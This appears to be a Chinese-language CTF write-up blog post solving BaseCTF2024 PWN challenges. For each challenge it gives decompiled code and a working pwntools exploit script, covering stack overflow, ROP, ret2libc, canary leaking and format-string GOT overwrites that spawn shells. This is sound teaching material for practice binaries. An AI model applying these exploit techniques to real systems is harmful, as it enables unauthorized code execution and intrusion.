---
title: BaseCTF2024
description: "复现了BaseCTF2024部分题目"
date: "2026-05-10 19:00:00"
draft: false
sticky: false
showHeroImage: false
tags: [PWN, WP]
categories: [WP]
series: []
comments: true
sidebar:
  enable: true
  toc: true
  relatedPosts: true
---


复现地址 [https://gz.imxbt.cn/games/13](https://gz.imxbt.cn/games/13)
[官方 WP](https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh)

## 签个到吧

> 怎么连接靶机呢

创建实例，连接靶机， `cat flag` 。

## echo

> binsh目录下只有echo？ echo flag??

使用 echo 输出 flag 内容。

```shell
echo "$(<flag)"
```

## Ret2text

> 原来栈是可以溢出的！

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | Full RELRO      |
| Stack | no canary found |
| NX    | NX enabled      |
| PIE   | PIE enabled     |

#### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  read(0, buf, 0x100u);
  return 0;
}
int dt_gift()
{
  puts("lol,you get dt's gift");
  return system("/bin/sh");
}
```

简单栈溢出，栈对齐，进入后门，getshell。

#### EXP

```python
from pwn import*

# io = process('./Ret2text')
io = remote('challenge.imxbt.cn',31217)

payload = b'a'*40 + p64(0x4011A3) + p64(0x4011A4)
io.sendline(payload)

io.interactive()
```



## gift

> 怎么这么多函数，这是为什么呢

#### 保护

是静态链接的题目，没什么保护。

#### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  IO_puts("Why so many functions, it seems that somewhere is not quite the same");
  IO_gets(v4);
  return 0;
}
```

静态链接的题目，有丰富的 gadget 可以使用， `gets` 可以无上限的读一行，写一个 rop 链打 ret2syscall ，先将字符串 `/bin/sh` 读到 `.bss` 段上

#### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug',terminal = ['tmux','new-window'])

pop_rax = 0x0000000000419484
pop_rdi = 0x0000000000401f2f
pop_rsi = 0x0000000000409f9e
pop_rdx_rbx = 0x000000000047f2eb
syscall = 0x0000000000401ce4
retn    = 0x000000000040101a
bss     = 0x4C72C0
IO_gets = 0x40C270

# io = process('./gift')
# io = remote("challenge.imxbt.cn",30976)
# gdb.attach(io)
payload1 = flat(
    b'a'*40,
    p64(pop_rdi),
    p64(bss),
    p64(pop_rax),
    p64(0),
    p64(IO_gets),

    p64(pop_rdi),
    p64(bss),
    p64(pop_rdx_rbx),
    p64(0),
    p64(0),
    p64(pop_rsi),
    p64(0),
    p64(pop_rax),
    p64(59),
    p64(syscall)
)
io.sendlineafter(b"the same",payload1)

io.sendline(b'/bin/sh\x00')
io.interactive()
```

## 我把她丢了

> 我把她丢了，你能帮我找到她吗

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | Partial RELRO   |
| Stack | no canary found |
| NX    | NX enabled      |
| PIE   | No PIE          |

#### 逆向

```c
int shell()
{
  return system("echo I beleve you.");
}
ssize_t vuln()
{
  _BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF

  puts("I lost her, what should I do? Help me find her.");
  return read(0, buf, 0x150u);
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```

发现后门中不再是 `system("/bin/sh")` 了，不过查找字符串发现程序还是提供了 `/bin/sh` 在 `0x402008` 的位置。

#### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug')

io = process('./losther') 

bin_sh  = 0x402008
pop_rdi = 0x401196
retn    = 0x40101a
gift    = 0x4011FD
payload = b'a'*120
payload += flat(
    p64(pop_rdi),
    p64(bin_sh),
    p64(retn),
    p64(0x401080)
)

io.recvuntil(b"I lost her, what should I do? Help me find her.\n")
io.send(payload)
io.interactive()
```

## 彻底失去她

> 函数好多参数怎么办，怎么找不到她了

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | Partial RELRO   |
| Stack | no canary found |
| NX    | NX enabled      |
| PIE   | No PIE          |

#### 逆向

```c
int present()
{
  return system("ls");
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  init();
  puts("Thank you for helping me find her.");
  puts("But she has left me for good this time, what should I do?");
  puts("By the way, I still don't know your name, could you tell me your name?");
  read(0, buf, 0x100u);
  return 0;
}
```

没有 `/bin/sh` 就自己读进去呗，溢出空间这不是挺大的。

#### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug',)
context.terminal = ['tmux','new-window']

io = process('./pwn')

io.recvuntil(b'name?')
pop_rdi = 0x401196
retn = 0x40101a
pop_rdx = 0x401265
pop_rsi = 0x4011ad 
bss_addr = 0x4040A0
call_read = 0x401090

payload = b'a'*18
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss_addr)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(call_read) 
payload += p64(pop_rdi) + p64(bss_addr)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rsi) + p64(0)
payload += p64(0x401080)

io.sendline(payload)
sleep(1)
io.sendline(b"/bin/sh\x00")
io.interactive()
```



## 她与你皆失

> 这下好了，什么都没了，你满意了？

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | Partial RELRO   |
| Stack | no canary found |
| NX    | NX enabled      |
| PIE   | No PIE          |

#### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  init(argc, argv, envp);
  puts("I have nothing, what should I do?");
  read(0, buf, 0x100u);
  return 0;
}
```

没有了她("/bin/sh")没有了你( system )，至少还有 `puts` 可以找到你们 (ret2libc) 。

EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug',)
# context.terminal = ['tmux','new-window']

elf  = ELF('./pwn')
libc = ELF('./libc.so.6')

pop_rdi = 0x0000000000401176
pop_rsi = 0x0000000000401178
pop_rdx = 0x0000000000401221
retn    = 0x000000000040101a

io = process('./pwn')
io.recvuntil(b"I have nothing, what should I do?\n")

payload = b'a'*18
payload += flat(
    p64(pop_rdi),
    p64(elf.got['puts']),
    p64(elf.plt['puts']),
    p64(0x4011DF)
)

io.send(payload)
leak = u64(io.recv(6).ljust(8,b'\x00'))
info(f"leak: {hex(leak)}")

libc_base = leak - libc.sym['puts']
system=libc_base+libc.symbols['system']
bin_sh=libc_base+next(libc.search(b'/bin/sh'))
io.recvuntil(b"I have nothing, what should I do?\n")

payload = b'a'*18
payload += flat(
    p64(pop_rdi),
    p64(bin_sh),
    p64(retn),
    p64(system)
)

io.send(payload)
io.interactive()
```

## 你为什么不让我溢出

> 啊？还有不让我溢出的保护，那怎么办

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | Partial RELRO   |
| Stack | Canary found    |
| NX    | NX enabled      |
| PIE   | No PIE(0x400000)|

#### 逆向

```c
int getshell()
{
  return system("/bin/sh");
}
unsigned __int64 vuln()
{
  int i; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  for ( i = 0; i <= 1; ++i )
  {
    read(0, buf, 0x200u);
    puts(buf);
  }
  return v3 - __readfsqword(0x28u);
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  puts("Hello Hacker!");
  vuln();
  return 0;
}
```

canary 不许溢出，canary 的低8位是 `\x00` ，程序允许输入打印两次，如果 `\n` 覆盖了 Canary 的低8位，puts 就可以打印出 canary ，这样泄露canary后就可以绕过文件保护了



#### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug',terminal = ['tmux','new-window'])

io=process('./pwn')
io.recvuntil(b"Hacker!")
payload1 = b'A'*(104)

io.sendline(payload1)
io.recvuntil(b'A'*104 +b'\x0a')
canary = u64(io.recv(7).rjust(8,b'\x00'))
log.info(f"canary: {hex(canary)}")

payload2 = flat(
    b'A'*104,
    p64(canary),
    b"SNOWCATT",
    p64(0x40101a),
    p64(0x4011B6),
)

io.sendline(payload2)
io.interactive()
```



## format_string_level0

> echo flag?? 你能利用格式化字符串把flag读出来吗

#### 保护

开启了所有的文件保护

#### 逆向

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+Ch] [rbp-124h]
  void *ptr; // [rsp+10h] [rbp-120h]
  ssize_t v6; // [rsp+18h] [rbp-118h]
  char buf[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+128h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init();
  ptr = malloc(0x100u);
  if ( ptr )
  {
    fd = open("flag", 0);
    if ( fd >= 0 )
    {
      v6 = read(fd, ptr, 0x100u);
      if ( v6 >= 0 )
      {
        *((_BYTE *)ptr + v6 - 1) = 0;
        read(0, buf, 0x100u);
        printf(buf);
        close(fd);
        free(ptr);
        return 0;
      }
      else
      {
        perror("read failed");
        close(fd);
        free(ptr);
        return 1;
      }
    }
    else
    {
      perror("open failed");
      free(ptr);
      return 1;
    }
  }
  else
  {
    perror("malloc failed");
    return 1;
  }
}
```

把flag读到了堆上，存在格式化字符串漏洞，在 gdb 中调试一下看到指针在栈上
```
pwndbg> stack
00:0000│ rsp 0x7fffffffd930 ◂— 0x3000000ba
01:0008│-128 0x7fffffffd938 ◂— 0x300000001
02:0010│-120 0x7fffffffd940 —▸ 0x5555555592a0 ◂— 'flag{test_flag}\n'
03:0018│-118 0x7fffffffd948 ◂— 0x10
04:0020│-110 0x7fffffffd950 ◂— 0x102f9
05:0028│-108 0x7fffffffd958 ◂— 2
06:0030│-100 0x7fffffffd960 ◂— 0x218c0329
07:0038│-0f8 0x7fffffffd968 —▸ 0x7fffffffda28 ◂— 0
pwndbg> fmtarg 0x7fffffffd940
The index of format argument : 8 (\"\%7$p\")
pwndbg> n
```

直接输入 `%8$p` 就能读出 flag

## format_string_level1

> 格式化字符串还可以实现任意地址写，你能实现一次任意地址写吗

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | Partial RELRO   |
| Stack | no canary found |
| NX    | NX enabled      |
| PIE   | No PIE          |

#### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v5; // [rsp+108h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  read(0, buf, 0x100u);
  printf(buf);
  if ( target )
    readflag();
  return 0;
}
void readflag()
{
  int fd; // [rsp+Ch] [rbp-14h]
  void *ptr; // [rsp+10h] [rbp-10h]
  ssize_t v2; // [rsp+18h] [rbp-8h]

  ptr = malloc(0x100u);
  if ( ptr )
  {
    fd = open("flag", 0);
    if ( fd >= 0 )
    {
      v2 = read(fd, ptr, 0x100u);
      if ( v2 >= 0 )
      {
        *((_BYTE *)ptr + v2 - 1) = 0;
        printf((const char *)ptr);
      }
      else
      {
        perror("read failed");
        close(fd);
        free(ptr);
      }
    }
    else
    {
      perror("open failed");
      free(ptr);
    }
  }
  else
  {
    perror("malloc failed");
  }
}
```

如果全局变量 target 不为零就打印 flag 。存在格式化字符串漏洞，用 `%n` 修改 target  的值。

可以用 `payload=p64(target_addr)+%7$n` 将这个值改成 target 的值改成 8 。但是发现这样字符串在打印时会因为 `\x00` 被截断，于是可以构造 

```python
payload = b'a'*8 + b'%8$nbbbb' + p64(0x4040B0)
#		  target被写在第8个参数	target地址
```



#### EXP

```python 
from pwn import *
context(arch='amd64',log_level='debug')

io=process('vuln')
payload =  b'a'*8 + b'%8$nbbbb' + p64(0x4040B0)
io.send(payload)
io.interactive()
```

## format_string_level2

> GOT表是什么呢? GOT是可以读写的，该怎么样getshell?

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | Partial RELRO   |
| Stack | no canary found |
| NX    | NX enabled      |
| PIE   | No PIE          |

#### 逆向

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+108h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(argc, argv, envp);
  while ( 1 )
  {
    read(0, buf, 0x100u);
    printf(buf);
  }
}
```

给的越来越少了，这里有无限次读取的机会，而且 Partial RELRO 意味 GOT 表可写，参考[【pwn之最】RELRO:最小丑的机制](https://blog.csdn.net/m0_71015193/article/details/137607117) 。如果把 `printf` 的 GOT 表改成 `system` 并将 buf 输入 "/bin/sh" 就可以触发 `system("/bin/sh")`  ，那么利用链为：

泄露 libc -> 改 GOT 表 -> 输入 `/bin/sh`

笔者习惯泄露两个函数的地址以提高 LibcSearcher 的准确率

#### EXP

```python
from pwn import *
from LibcSearcher import *
context(arch='amd64',log_level='debug')
context.terminal=['tmux','new-window']

read_got = 0x403310
printf_got = 0x0403308
setvbuf_got = 0x403318

io = process('./pwn')
# gdb.attach(io)
payload1 = b'%8$sAAAAAAAA%9$s' + p64(read_got) + p64(setvbuf_got)
io.send(payload1)
read = u64(io.recv(6).ljust(8, b'\x00'))
io.recvuntil(b'A'*8)
setvbuf = u64(io.recv(6).ljust(8, b'\x00'))
log.info(f"read -> {hex(read)}")
log.info(f"setvbuf -> {hex(setvbuf)}")

libc = LibcSearcher("setvbuf", setvbuf)
libc.add_condition("read", read)  
libc_base = read - libc.dump('read')
system = libc_base + libc.dump('system')
log.info(f"system -> {hex(system)}")

payload2 = fmtstr_payload(6,{printf_got:system})
io.sendline(payload2)

io.sendline(b'/bin/sh')
io.interactive()
```

## format_string_level3

> 只有一次格式化字符串的机会？？？😭😭😭

#### 保护

| 属性  | 值              |
| ----- | --------------- |
| Arch  | amd64-64-little |
| RELRO | No RELRO        |
| Stack | Canary found    |
| NX    | NX enabled      |
| PIE   | No PIE          |

#### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v5; // [rsp+108h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init();
  puts("-----");
  read(0, buf, 0x110u);
  printf(buf);
  return 0;
}
```

这下什么也没有了，但是还有栈上的信息和一个格式化字符串漏洞，而且又canary，没有栈溢出，打不了 rop 。要想多次输入，于是修改了 ` __stack_chk_fail` 的 GOT 表，这样每次输入都覆盖 canary 就可以循环起来了。再通过栈上的数据泄露 Libc 。 接下来就与 [format_string_level2](#format_string_level2) 一样了。

#### EXP

```python
from pwn import *
context(arch='amd64',log_level='debug')
context.terminal=['tmux','new-window']
io = remote("challenge.imxbt.cn",31892)
# io = process('./vuln')
check_got = 0x403320
main_addr = 0x40121B
printf_got= 0x403328
# gdb.attach(io,'b *0x401288')
payload0 = fmtstr_payload(6,{check_got:main_addr})  +b'a'*208
log.info(len(payload0))
io.recvuntil(b"-----")
io.send(payload0)

io.recvuntil(b'-----\n')
payload1 = b'%77$pAAA' + b'B'*264
io.send(payload1)

io.recvuntil(b'0x')
libc_base = int(io.recv(12),16) -0x29d90
log.info(f"libc -> {hex(libc_base)}")

libc = ELF('./libc.so.6')
system = libc_base + libc.sym['system']
log.info(hex(system))
io.recvuntil(b'-----\n')

payload2 = fmtstr_payload(6,{printf_got:system}) + b'C'*(152)
log.info(len(payload2))
io.send(payload2)
io.recvuntil(b'-----\n')
io.send(b'/bin/sh\x00')

io.interactive()
```

